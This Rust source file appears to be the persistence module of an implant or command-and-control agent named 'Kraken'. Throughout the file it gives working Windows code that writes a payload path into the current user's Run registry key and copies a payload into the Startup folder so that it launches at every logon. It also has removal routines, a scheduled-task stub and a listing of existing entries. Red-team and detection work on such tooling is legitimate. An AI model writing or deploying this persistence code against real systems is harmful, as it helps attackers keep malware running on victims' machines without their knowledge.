//! Persistence method implementations (Windows-only)

use common::{KrakenError, PersistenceListOutput, PersistenceOpResult};

// ============================================================
// Windows implementations
// ============================================================

#[cfg(windows)]
use std::ffi::OsStr;
#[cfg(windows)]
use std::os::windows::ffi::OsStrExt;
#[cfg(windows)]
use windows_sys::Win32::Foundation::ERROR_SUCCESS;
#[cfg(windows)]
use windows_sys::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExW, RegDeleteValueW, RegOpenKeyExW, RegQueryValueExW,
    RegSetValueExW, HKEY, HKEY_CURRENT_USER, KEY_ALL_ACCESS, KEY_READ, REG_SZ,
};

/// Convert a Rust &str to a null-terminated UTF-16 Vec<u16>
#[cfg(windows)]
fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0u16))
        .collect()
}

/// Open or create a registry key under HKCU
#[cfg(windows)]
fn open_or_create_hkcu_key(subkey: &str) -> Result<HKEY, KrakenError> {
    let subkey_wide = to_wide(subkey);
    let mut hkey: HKEY = 0;
    let mut disposition: u32 = 0;
    let status = unsafe {
        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            subkey_wide.as_ptr(),
            0,
            std::ptr::null_mut(),
            0,
            KEY_ALL_ACCESS,
            std::ptr::null_mut(),
            &mut hkey,
            &mut disposition,
        )
    };
    if status != ERROR_SUCCESS {
        return Err(KrakenError::Module(format!(
            "RegCreateKeyExW failed with error {}",
            status
        )));
    }
    Ok(hkey)
}

/// Check whether a named value exists in an HKCU registry key
#[cfg(windows)]
fn hkcu_value_exists(subkey: &str, value_name: &str) -> bool {
    let subkey_wide = to_wide(subkey);
    let mut hkey: HKEY = 0;
    let status = unsafe {
        RegOpenKeyExW(
            HKEY_CURRENT_USER,
            subkey_wide.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        )
    };
    if status != ERROR_SUCCESS {
        return false;
    }
    let value_wide = to_wide(value_name);
    let exists = unsafe {
        RegQueryValueExW(
            hkey,
            value_wide.as_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    } == ERROR_SUCCESS;
    unsafe { RegCloseKey(hkey) };
    exists
}

// ============================================================
// Registry Run key
// ============================================================

#[cfg(windows)]
const RUN_KEY: &str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

/// Install an entry in HKCU\...\Run pointing to `payload_path`.
#[cfg(windows)]
pub fn install_registry_run(name: &str, payload_path: &str) -> Result<PersistenceOpResult, KrakenError> {
    let hkey = open_or_create_hkcu_key(RUN_KEY)?;

    // Build a REG_SZ value (UTF-16, null-terminated)
    let mut value_data: Vec<u16> = OsStr::new(payload_path)
        .encode_wide()
        .chain(std::iter::once(0u16))
        .collect();
    let value_name_wide = to_wide(name);

    let status = unsafe {
        RegSetValueExW(
            hkey,
            value_name_wide.as_ptr(),
            0,
            REG_SZ,
            value_data.as_mut_ptr() as *const u8,
            (value_data.len() * 2) as u32,
        )
    };
    unsafe { RegCloseKey(hkey) };

    if status != ERROR_SUCCESS {
        return Err(KrakenError::Module(format!(
            "RegSetValueExW failed with error {}",
            status
        )));
    }

    Ok(PersistenceOpResult {
        operation: "install".to_string(),
        method: "registry_run".to_string(),
        name: name.to_string(),
        success: true,
        message: Some(format!(
            "Installed HKCU\\{}\\{} -> {}",
            RUN_KEY, name, payload_path
        )),
    })
}

/// Remove an entry from HKCU\...\Run.
#[cfg(windows)]
pub fn remove_registry_run(name: &str) -> Result<PersistenceOpResult, KrakenError> {
    let subkey_wide = to_wide(RUN_KEY);
    let mut hkey: HKEY = 0;
    let status = unsafe {
        RegOpenKeyExW(
            HKEY_CURRENT_USER,
            subkey_wide.as_ptr(),
            0,
            KEY_ALL_ACCESS,
            &mut hkey,
        )
    };
    if status != ERROR_SUCCESS {
        return Err(KrakenError::Module(format!(
            "RegOpenKeyExW failed with error {}",
            status
        )));
    }

    let value_wide = to_wide(name);
    let status = unsafe { RegDeleteValueW(hkey, value_wide.as_ptr()) };
    unsafe { RegCloseKey(hkey) };

    if status != ERROR_SUCCESS {
        return Err(KrakenError::Module(format!(
            "RegDeleteValueW failed with error {}",
            status
        )));
    }

    Ok(PersistenceOpResult {
        operation: "remove".to_string(),
        method: "registry_run".to_string(),
        name: name.to_string(),
        success: true,
        message: Some(format!("Removed HKCU\\{}\\{}", RUN_KEY, name)),
    })
}

// ============================================================
// Startup folder
// ============================================================

/// Resolve %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
#[cfg(windows)]
fn startup_folder_path(name: &str) -> Result<std::path::PathBuf, KrakenError> {
    let appdata = std::env::var("APPDATA").map_err(|_| {
        KrakenError::Module("APPDATA environment variable not set".into())
    })?;
    let mut path = std::path::PathBuf::from(appdata);
    path.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    path.push(name);
    // Ensure it ends with .lnk or preserve extension from caller
    Ok(path)
}

/// Copy `source_path` into the current user's Startup folder as `name`.
#[cfg(windows)]
pub fn install_startup_folder(
    name: &str,
    payload_path: &str,
) -> Result<PersistenceOpResult, KrakenError> {
    let dest = startup_folder_path(name)?;

    // Create the Startup directory if it doesn't exist (rare, but defensive)
    if let Some(parent) = dest.parent() {
        std::fs::create_dir_all(parent).map_err(|e| {
            KrakenError::Module(format!("create_dir_all failed: {}", e))
        })?;
    }

    std::fs::copy(payload_path, &dest).map_err(|e| {
        KrakenError::Module(format!(
            "copy {} -> {} failed: {}",
            payload_path,
            dest.display(),
            e
        ))
    })?;

    Ok(PersistenceOpResult {
        operation: "install".to_string(),
        method: "startup_folder".to_string(),
        name: name.to_string(),
        success: true,
        message: Some(format!(
            "Copied {} -> {}",
            payload_path,
            dest.display()
        )),
    })
}

/// Remove a file from the current user's Startup folder.
#[cfg(windows)]
pub fn remove_startup_folder(name: &str) -> Result<PersistenceOpResult, KrakenError> {
    let dest = startup_folder_path(name)?;
    std::fs::remove_file(&dest).map_err(|e| {
        KrakenError::Module(format!(
            "remove_file {} failed: {}",
            dest.display(),
            e
        ))
    })?;

    Ok(PersistenceOpResult {
        operation: "remove".to_string(),
        method: "startup_folder".to_string(),
        name: name.to_string(),
        success: true,
        message: Some(format!("Removed {}", dest.display())),
    })
}

// ============================================================
// Scheduled task (stub)
// ============================================================

#[cfg(windows)]
pub fn install_scheduled_task(
    _name: &str,
    _payload_path: &str,
) -> Result<PersistenceOpResult, KrakenError> {
    Err(KrakenError::Module(
        "scheduled task persistence is not yet implemented".into(),
    ))
}

#[cfg(windows)]
pub fn remove_scheduled_task(_name: &str) -> Result<PersistenceOpResult, KrakenError> {
    Err(KrakenError::Module(
        "scheduled task persistence is not yet implemented".into(),
    ))
}

// ============================================================
// List known persistence locations
// ============================================================

#[cfg(windows)]
pub fn list_persistence() -> Result<PersistenceListOutput, KrakenError> {
    let mut entries = Vec::new();

    // Check HKCU Run key
    let run_subkey_wide = to_wide(RUN_KEY);
    let mut hkey: HKEY = 0;
    let status = unsafe {
        RegOpenKeyExW(
            HKEY_CURRENT_USER,
            run_subkey_wide.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        )
    };

    if status == ERROR_SUCCESS {
        use windows_sys::Win32::Foundation::{ERROR_MORE_DATA, ERROR_NO_MORE_ITEMS};
        use windows_sys::Win32::System::Registry::RegEnumValueW;

        let mut index: u32 = 0;
        loop {
            let mut name_buf = vec![0u16; 16384];
            let mut name_len = name_buf.len() as u32;
            let mut reg_type: u32 = 0;
            let mut data_buf = vec![0u8; 32768];
            let mut data_len = data_buf.len() as u32;

            let s = unsafe {
                RegEnumValueW(
                    hkey,
                    index,
                    name_buf.as_mut_ptr(),
                    &mut name_len,
                    std::ptr::null_mut(),
                    &mut reg_type,
                    data_buf.as_mut_ptr(),
                    &mut data_len,
                )
            };

            if s == ERROR_NO_MORE_ITEMS {
                break;
            }
            if s != ERROR_SUCCESS && s != ERROR_MORE_DATA {
                break;
            }

            // Decode name
            let name_end = name_buf[..name_len as usize]
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(name_len as usize);
            let name = String::from_utf16_lossy(&name_buf[..name_end]);

            // Decode value (REG_SZ stored as UTF-16)
            let payload = if reg_type == REG_SZ && data_len >= 2 {
                let words: Vec<u16> = data_buf[..data_len as usize]
                    .chunks_exact(2)
                    .map(|b| u16::from_le_bytes([b[0], b[1]]))
                    .collect();
                let end = words.iter().position(|&c| c == 0).unwrap_or(words.len());
                String::from_utf16_lossy(&words[..end]).into_owned()
            } else {
                String::new()
            };

            entries.push(common::PersistenceEntryInfo {
                method: "registry_run".to_string(),
                name,
                location: format!("HKCU\\{}", RUN_KEY),
                payload,
            });

            index += 1;
        }
        unsafe { RegCloseKey(hkey) };
    }

    // Check Startup folder
    if let Ok(appdata) = std::env::var("APPDATA") {
        let startup_dir = std::path::PathBuf::from(&appdata)
            .join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        if let Ok(rd) = std::fs::read_dir(&startup_dir) {
            for entry in rd.flatten() {
                let file_name = entry.file_name().to_string_lossy().into_owned();
                if file_name == "desktop.ini" {
                    continue;
                }
                entries.push(common::PersistenceEntryInfo {
                    method: "startup_folder".to_string(),
                    name: file_name.clone(),
                    location: startup_dir.display().to_string(),
                    payload: entry.path().display().to_string(),
                });
            }
        }
    }

    Ok(PersistenceListOutput { entries })
}

// ============================================================
// Non-Windows stubs
// ============================================================

#[cfg(not(windows))]
pub fn install_registry_run(
    _name: &str,
    _payload_path: &str,
) -> Result<PersistenceOpResult, KrakenError> {
    Err(KrakenError::Module(
        "persistence via registry is only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn remove_registry_run(_name: &str) -> Result<PersistenceOpResult, KrakenError> {
    Err(KrakenError::Module(
        "persistence via registry is only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn install_startup_folder(
    _name: &str,
    _payload_path: &str,
) -> Result<PersistenceOpResult, KrakenError> {
    Err(KrakenError::Module(
        "persistence via startup folder is only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn remove_startup_folder(_name: &str) -> Result<PersistenceOpResult, KrakenError> {
    Err(KrakenError::Module(
        "persistence via startup folder is only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn install_scheduled_task(
    _name: &str,
    _payload_path: &str,
) -> Result<PersistenceOpResult, KrakenError> {
    Err(KrakenError::Module(
        "scheduled task persistence is only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn remove_scheduled_task(_name: &str) -> Result<PersistenceOpResult, KrakenError> {
    Err(KrakenError::Module(
        "scheduled task persistence is only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn list_persistence() -> Result<PersistenceListOutput, KrakenError> {
    Err(KrakenError::Module(
        "persistence listing is only supported on Windows".into(),
    ))
}
